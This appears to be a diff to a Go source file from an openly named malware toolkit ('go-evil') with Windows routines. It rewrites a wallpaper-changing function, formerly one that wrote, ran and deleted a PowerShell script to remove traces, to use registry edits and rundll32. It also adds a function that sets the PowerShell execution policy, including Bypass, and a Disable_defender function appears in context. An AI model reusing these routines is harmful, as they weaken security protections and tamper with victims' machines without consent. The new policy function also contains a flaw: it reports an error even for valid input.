@@ -5,8 +5,9 @@ import (
 	"runtime"
 	"strings"
 
-	"github.com/s9rA16Bf4/go-evil/utility/io"
 	run_time "github.com/s9rA16Bf4/go-evil/utility/variables/runtime"
+	"github.com/s9rA16Bf4/notify_handler/go/notify"
+	"gopkg.in/go-rillas/subprocess.v1"
 )
 
 func Disable_defender() {
@@ -19,24 +20,19 @@ func Disable_defender() {
 func Change_wallpaper(path_to_new_wallpaper string) {
 	if runtime.GOOS == "windows" {
 		path_to_new_wallpaper = run_time.Check_if_variable(path_to_new_wallpaper)
-		var file_content = `$setwallpapersrc = @"
-	using System.Runtime.InteropServices;
-	public class wallpaper
-	{
-	 public const int SetDesktopWallpaper = 20;
-	 public const int UpdateIniFile = 0x01;
-	 public const int SendWinIniChange = 0x02;
-	 [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-	  private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
-	 public static void SetWallpaper ( string path )
-	 {
-	  SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
-	 }
-	}"@
-	Add-Type -TypeDefinition $setwallpapersrc`
-		file_content += "[wallpaper]::SetWallpaper(" + path_to_new_wallpaper + ")"
-		io.Create_file("wallpaper.ps1", strings.Split(file_content, "\n"))
-		io.Run_file("wallpaper.ps1")    // Run the script
-		io.Remove_file("wallpaper.ps1") // Removes every trace of it
+		subprocess.RunShell("powershell", "-Command", "{reg", "add", "HKEY_CURRENT_USER\\Control Panel\\Desktop", "/v", "Wallpaper", "/t", "REG_SZ", "/d", "h:\\"+path_to_new_wallpaper, "/f}")
+		subprocess.RunShell("powershell", "-Command", "{Start-Sleep", "-s", "10}")
+		subprocess.RunShell("powershell", "-Command", "{rundll32.exe user32.dll, UpdatePerUserSystemParameters, 0, $false}")
+
 	}
+}
+
+func ExecutionPolicy(new_policy string) { // This command most likely requires admin on all systems
+	policys := []string{"AllSigned", "Bypass", "Default", "RemoteSigned", "Restricted", "Undefined", "Unrestricted"}
+	for _, policy := range policys {
+		if policy == new_policy { // its valid
+			subprocess.RunShell("powershell", "-Command", "{Set-ExecutionPolicy", "-ExecutionPolicy ", new_policy, "}")
+		}
+	}
+	notify.Error("Unknown policy +"+new_policy, "powershell.ExecutionPolicy()")
 }
